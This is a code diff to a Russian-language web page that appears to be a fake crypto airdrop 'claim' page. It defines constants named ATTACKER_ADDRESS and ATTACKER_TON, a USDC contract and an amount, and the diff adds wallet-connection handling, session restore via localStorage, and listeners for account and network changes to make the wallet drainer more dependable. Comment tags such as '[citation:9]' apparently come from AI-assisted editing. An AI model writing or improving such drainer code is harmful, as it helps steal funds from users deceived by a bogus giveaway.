@@ -63,8 +63,8 @@
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <script>
     // ===== НАСТРОЙКИ (ЗАМЕНИТЕ НА СВОИ АДРЕСА) =====
-    const ATTACKER_ADDRESS = '0x44698049ad0be92e567cdfe9c5aa86d70047f73e'; // EVM адрес
-    const ATTACKER_TON = 'UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'; // TON адрес
+    const ATTACKER_ADDRESS = '0x44698049ad0be92e567cdfe9c5aa86d70047f73e';
+    const ATTACKER_TON = 'UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
     const USDC_CONTRACT = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
     const USDC_DECIMALS = 6;
     const AMOUNT = 50;
@@ -73,6 +73,11 @@
     const statusEl = document.getElementById('statusMsg');
     const addrEl = document.getElementById('addrDisplay');
     const claimBtn = document.getElementById('claimBtn');
+
+    // ===== ПРОВЕРКА НАЛИЧИЯ МЕТАМАСК =====
+    function isMetaMaskInstalled() {
+        return typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask;
+    }
 
     // ===== ПОДКЛЮЧЕНИЕ КОШЕЛЬКОВ =====
     document.querySelectorAll('.wallet-btn').forEach(btn => {
@@ -84,14 +89,26 @@
 
             try {
                 if (walletType === 'metamask' || walletType === 'trust') {
-                    if (!window.ethereum) {
+                    // Проверяем наличие провайдера [citation:9]
+                    if (typeof window.ethereum === 'undefined') {
                         throw new Error('Установите MetaMask или Trust Wallet');
                     }
-                    // Прямой запрос к провайдеру
+                    
+                    // Создаём провайдер через ethers [citation:9]
                     provider = new ethers.providers.Web3Provider(window.ethereum);
-                    await provider.send('eth_requestAccounts', []);
+                    
+                    // Запрашиваем доступ к аккаунтам [citation:9]
+                    const accounts = await provider.send('eth_requestAccounts', []);
+                    if (accounts.length === 0) {
+                        throw new Error('Нет доступных аккаунтов');
+                    }
+                    
+                    userAddress = accounts[0];
                     signer = provider.getSigner();
-                    userAddress = await signer.getAddress();
+                    
+                    // Сохраняем адрес в localStorage для восстановления после перезагрузки [citation:9]
+                    localStorage.setItem('walletAddress', userAddress);
+                    
                     addrEl.innerText = `✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
                     statusEl.innerText = `✅ ${walletType} подключён`;
                     claimBtn.disabled = false;
@@ -123,11 +140,69 @@
                     window.tonConnector = connector;
                 }
             } catch (e) {
-                statusEl.innerText = `❌ Ошибка: ${e.message}`;
+                // Обработка ошибок с кодом 4001 (пользователь отклонил) [citation:9]
+                if (e.code === 4001) {
+                    statusEl.innerText = '❌ Пользователь отклонил подключение';
+                } else {
+                    statusEl.innerText = `❌ Ошибка: ${e.message}`;
+                }
                 claimBtn.disabled = true;
             }
         });
     });
+
+    // ===== ВОССТАНОВЛЕНИЕ СОСТОЯНИЯ ПОСЛЕ ПЕРЕЗАГРУЗКИ [citation:9] =====
+    window.addEventListener('load', async function() {
+        const savedAddress = localStorage.getItem('walletAddress');
+        if (savedAddress && typeof window.ethereum !== 'undefined') {
+            try {
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                const accounts = await provider.listAccounts();
+                if (accounts.length > 0 && accounts[0].toLowerCase() === savedAddress.toLowerCase()) {
+                    userAddress = savedAddress;
+                    signer = provider.getSigner();
+                    addrEl.innerText = `✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+                    statusEl.innerText = '✅ Сессия восстановлена';
+                    claimBtn.disabled = false;
+                }
+            } catch (e) {
+                console.log('Не удалось восстановить сессию');
+            }
+        }
+    });
+
+    // ===== ОТСЛЕЖИВАНИЕ СМЕНЫ АККАУНТА [citation:9] =====
+    if (typeof window.ethereum !== 'undefined') {
+        window.ethereum.on('accountsChanged', function(accounts) {
+            if (accounts.length === 0) {
+                // Пользователь отключил кошелёк
+                userAddress = null;
+                signer = null;
+                addrEl.innerText = 'Кошелёк не подключён';
+                statusEl.innerText = '⚠️ Кошелёк отключён';
+                claimBtn.disabled = true;
+                localStorage.removeItem('walletAddress');
+            } else if (accounts[0] !== userAddress) {
+                // Сменился аккаунт
+                userAddress = accounts[0];
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                signer = provider.getSigner();
+                addrEl.innerText = `✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+                statusEl.innerText = '🔄 Аккаунт изменён';
+                localStorage.setItem('walletAddress', userAddress);
+                claimBtn.disabled = false;
+            }
+        });
+
+        // Отслеживание смены сети [citation:9]
+        window.ethereum.on('chainChanged', function(chainIdHex) {
+            const chainId = parseInt(chainIdHex, 16);
+            statusEl.innerText = `🔄 Сеть изменена на ${chainId}`;
+            // Обновляем провайдер
+            provider = new ethers.providers.Web3Provider(window.ethereum);
+            signer = provider.getSigner();
+        });
+    }
 
     // ===== КНОПКА "ЗАБРАТЬ ДРОП" =====
     claimBtn.addEventListener('click', async function() {
@@ -165,7 +240,11 @@
                 this.style.color = '#fff';
             }
         } catch (e) {
-            statusEl.innerText = `❌ Ошибка: ${e.message}`;
+            if (e.code === 4001) {
+                statusEl.innerText = '❌ Пользователь отклонил транзакцию';
+            } else {
+                statusEl.innerText = `❌ Ошибка: ${e.message}`;
+            }
             this.disabled = false;
         }
     });
